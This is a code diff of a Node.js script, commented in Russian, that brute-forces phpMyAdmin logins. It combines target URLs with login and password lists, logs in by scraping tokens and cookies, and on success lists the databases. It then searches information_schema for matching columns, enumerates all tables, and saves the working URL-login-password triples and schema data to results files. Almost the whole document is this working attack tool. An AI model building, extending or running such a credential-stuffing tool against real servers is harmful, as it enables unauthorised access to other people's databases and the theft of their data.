@@ -1,8 +1,21 @@
 const fs = require('fs');
 const cheerio = require("cheerio");
-const loggedAxiosRequest = require("./services/loggedAxiosRequest");
 const axios = require("axios");
+const winston = require("winston");
 require('dotenv').config();
+
+// Настройка логгера
+const logger = winston.createLogger({
+    level: 'info',
+    format: winston.format.combine(
+        winston.format.timestamp(),
+        winston.format.printf(info => `${info.timestamp} ${info.level}: ${info.message}`)
+    ),
+    transports: [
+        new winston.transports.Console(),
+        new winston.transports.File({ filename: './logs/app.log' })
+    ]
+});
 
 function readFileIfExists(filename) {
     if (fs.existsSync(filename)) {
@@ -10,14 +23,14 @@ function readFileIfExists(filename) {
             fs.readFileSync(filename, 'utf-8')
                 .split('\n')
                 .map(line => line.trim())
-                .filter(line => line) // Убираем пустые строки
+                .filter(line => line)
         );
     }
     return new Set();
 }
 
 // === Читаем входные данные ===
-const mainFile = process.env.MAIN_FILE || "./files/input.txt"; // Основной файл
+const mainFile = process.env.MAIN_FILE || "./files/input.txt";
 const loginsFile = "./files/logins.txt";
 const passwordsFile = "./files/passwords.txt";
 
@@ -26,9 +39,9 @@ const rawLines = readFileIfExists(mainFile);
 const logins = readFileIfExists(loginsFile);
 const passwords = readFileIfExists(passwordsFile);
 
-let targets = new Set(); // Используем Set, чтобы избежать дубликатов
+let targets = new Set();
 
-// Функция для разбора строки (правильно отделяет URL, логин и пароль)
+// Функция для разбора строки
 function parseLine(line) {
     const match = line.match(/^(https?:\/\/[^\s:]+(:\d+)?(?:\/[^\s:]*)?):([^:]+):(.+)$/);
     if (match) {
@@ -48,7 +61,6 @@ for (const line of rawLines) {
         const altUrl = parsed.url.startsWith("http://")
             ? parsed.url.replace("http://", "https://")
             : parsed.url.replace("https://", "http://");
-
         targets.add({ url: altUrl, login: parsed.login, password: parsed.password });*/
     }
 }
@@ -57,7 +69,7 @@ for (const line of rawLines) {
 const loginList = [...logins];
 const passwordList = [...passwords];
 
-let combinations = new Set(); // Избегаем дубликатов
+let combinations = new Set();
 
 for (const { url, login, password } of targets) {
     // Оригинальная комбинация
@@ -76,7 +88,6 @@ for (const { url, login, password } of targets) {
     const altUrl = url.startsWith("http://")
         ? url.replace("http://", "https://")
         : url.replace("https://", "http://");
-
     combinations.add({ url: altUrl, login, password });*/
 
     passwordList.forEach(extraPassword => {
@@ -99,12 +110,12 @@ for (const obj of combinations) {
 // Преобразуем обратно в Set
 const uniqueCombinations = new Set(uniqueMap.values());
 
-// Выводим количество сформированных комбинаций
 console.log(`✅ Сформировано ${uniqueCombinations.size} комбинаций для тестирования.`);
 
 class PmaClient {
 
      phpMyAdminUrl;
+     queryUrl;
      cookie;
      login;
      password;
@@ -114,10 +125,11 @@ class PmaClient {
      pmaUser_1;
      pmaAuth_1;
      encodedAuth; // для авторизации при ['auth_type'] = 'http'
-     session; // для cookie авторизации
+     session;
 
     constructor(phpMyAdminUrl, login, password) {
         this.phpMyAdminUrl = phpMyAdminUrl.endsWith('/') ? phpMyAdminUrl : phpMyAdminUrl + '/';
+        this.queryUrl = `${this.phpMyAdminUrl.replace(/index\.php\/?$/, '')}import.php`;
         this.login = login;
         this.password = password;
     }
@@ -140,17 +152,12 @@ class PmaClient {
 
             if (foundCookie) {
                 const cookieValue = foundCookie.split(";")[0];
-
                 if (cookieValue.includes("=deleted")) {
-                    //console.log(`Skipping deleted cookie for key "${key}": ${cookieValue}`);
                     return;
                 }
-
                 this[key] = cookieValue;
-                //console.log(`Assigned cookie for key "${key}": ${this[key]}`);
             }
         });
-
         this.session = this.cookie.replace(/phpMyAdmin(_https)?=/, "");
     }
 
@@ -160,9 +167,7 @@ class PmaClient {
         const token = $('input[name="token"]').val();
         if (!token) throw new Error("Не удалось извлечь токен.");
         this.token = token;
-        //console.log(`Assigned token: ${this.token}`);
     }
-
 
     // === Функция для авторизации при ['auth_type'] = 'cookie' ===
     loginAndGetCookies = async () => {
@@ -230,14 +235,13 @@ class PmaClient {
             }
             console.log(`✅ Авторизация успешна (${this.phpMyAdminUrl}:${this.login}:${this.password}).`);
             return true;
-
         } catch (error) {
-            console.log(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message}`);
+            console.log(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message} -> ${error.stack}`);
             return false;
         }
     };
     // === Функция для авторизации при ['auth_type'] = 'http' ===
-    loginAndGetCookiesHttp = async () => {
+    /*loginAndGetCookiesHttp = async () => {
         try {
             // Запрос к странице входа для получения куки
             const response = await axios.get(this.phpMyAdminUrl, {
@@ -267,18 +271,16 @@ class PmaClient {
             console.log(`✅ Авторизация успешна (${this.login}:${this.password}).`);
             return true;
         } catch (error) {
-            console.log(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message}`);
+            console.log(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message} -> ${error.stack}`);
             return false;
             //throw error;
         }
-    };
+    };*/
 
     // === Функция для выполнения SQL-запросов ===
     executeSQLQuery = async (query) => {
-        const phpMyAdminUrl = this.phpMyAdminUrl.trim().replace(/index\.php\/?$/, '');
-        const queryUrl = `${phpMyAdminUrl}import.php`;
         try {
-            const response = await axios.post(queryUrl, new URLSearchParams({
+            const response = await axios.post(this.queryUrl, new URLSearchParams({
                 token: this.token,
                 sql_query: query,
                 is_js_confirmed: "0",
@@ -304,19 +306,130 @@ class PmaClient {
                 return $(row).find('td').first().text().trim();
             }).get();
             console.log(`Найденные базы данных (${databases.length}): \x1b[32m${databases.join(", ")}\x1b[0m`);
+            //this.updateCookies()
+            return databases;
 
         } catch (error) {
             console.log("❌ Ошибка выполнения SQL-запроса:", error.message);
         }
     }
+
+    // === Функция для поиска колонок в таблицах ===
+    findColumnsInTables = async (database, columns) => {
+
+        // Разделяем строку columns на отдельные значения
+        const columnsToSearch = columns.split(',').map(col => col.trim());
+
+        // Формируем условия LIKE для каждого значения
+        const likeConditions = columnsToSearch.map(col => `COLUMN_NAME LIKE '%${col}%'`).join(' OR ');
+        try {
+            const response = await axios.post(this.queryUrl, new URLSearchParams({
+                token: this.token,
+                sql_query: `SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = '${database}' AND (${likeConditions})`,
+                is_js_confirmed: "0",
+                ajax_request: "true",
+                _nocache: Date.now(),
+                goto: "server_sql.php",
+                ajax_page_request: true
+            }).toString(), {
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
+                    Cookie: [this.cookie, this.pmaCookieVer, this.pma_collation_connection, this.pmaUser_1, this.pmaAuth_1]
+                        .filter(Boolean)
+                        .join("; "),
+                    Authorization: this.encodedAuth,
+                    "X-Requested-With": "XMLHttpRequest"
+                },
+            });
+            if (!response.data.success) throw new Error('Запрос не выполнен');
+            const $ = cheerio.load(response.data.message);
+            return $('table.table_results tbody tr').map((_, row) => {
+                return $(row).find('td').map((_, td) => $(td).text().trim()).get();
+            }).get();
+        } catch (error) {
+            logger.error(`Ошибка выполнения SQL-запроса findColumnsInTables: ${error.message}`);
+            return [];
+        }
+    }
+
+    // === Функция для получения списка всех таблиц ===
+    getAllTables = async (database) => {
+        try {
+            const response = await axios.post(this.queryUrl, new URLSearchParams({
+                token: this.token,
+                sql_query: `SHOW TABLES FROM \`${database}\``,
+                is_js_confirmed: "0",
+                ajax_request: "true",
+                _nocache: Date.now(),
+                goto: "server_sql.php",
+                ajax_page_request: true
+            }).toString(), {
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
+                    Cookie: [this.cookie, this.pmaCookieVer, this.pma_collation_connection, this.pmaUser_1, this.pmaAuth_1]
+                        .filter(Boolean)
+                        .join("; "),
+                    Authorization: this.encodedAuth,
+                    "X-Requested-With": "XMLHttpRequest"
+                },
+            });
+            if (!response.data.success) throw new Error('Запрос не выполнен');
+            const $ = cheerio.load(response.data.message);
+            return $('table.table_results tbody tr').map((_, row) => {
+                return $(row).find('td').first().text().trim();
+            }).get();
+        } catch (error) {
+            logger.error(`Ошибка выполнения SQL-запроса getAllTables в ${database}: ${error.message}`);
+            return [];
+        }
+    }
 }
 
-// === Цикл перебора всех комбинаций ===
+// === Цикл перебора комбинаций ===
 (async () => {
+    const results = []; // Массив для хранения результатов таблиц
+
     for (const { url, login, password } of uniqueCombinations) {
         const client = new PmaClient(url, login, password);
         if (await client.loginAndGetCookies()) {
-            await client.executeSQLQuery("SHOW DATABASES;");
+            const databases = await client.executeSQLQuery("SHOW DATABASES;");
+            const entry = {
+                url: url,
+                login: login,
+                password: password,
+                databases: {}
+            };
+
+            for (const database of databases) {
+
+                // Поиск колонок
+                const columnsToFind = 'name, table';
+                const foundColumns = await client.findColumnsInTables(database, columnsToFind);
+                if (foundColumns.length > 0) {
+                    foundColumns.forEach((column) => {
+                        fs.appendFileSync('./results/found_columns.txt', `${url}:${login}:${password}|${column}\n`);
+                    });
+                }
+
+                // Получение списка таблиц
+                const tables = await client.getAllTables(database);
+                if (tables.length > 0) {
+                    entry.databases[database] = tables; // Добавляем таблицы в базу данных
+                }
+            }
+            // Если найдены таблицы, добавляем запись в результаты
+            if (Object.keys(entry.databases).length > 0) {
+                results.push(entry);
+            }
         }
+    }
+
+    if (results.length > 0) {
+        fs.writeFileSync('./results/all_tables.json', JSON.stringify(results, null, 2));
+        logger.info('Результаты таблиц успешно записаны в all_tables.json');
+    } else {
+        logger.warn('Нет данных для записи в all_tables.json');
     }
 })();
